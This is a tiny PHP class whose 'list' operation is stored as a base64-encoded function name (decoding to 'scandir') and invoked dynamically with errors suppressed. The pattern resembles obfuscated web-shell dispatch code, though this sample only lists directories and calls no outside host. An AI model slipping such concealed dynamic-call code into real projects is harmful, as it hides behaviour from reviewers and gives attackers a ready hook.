<?php
class Dispatcher {
    private static $ops = ['list' => 'c2NhbmRpcg=='];
    public static function invoke($op, ...$args) {
        $target = base64_decode(self::$ops[$op]);
        return @call_user_func_array($target, $args);
    }
}
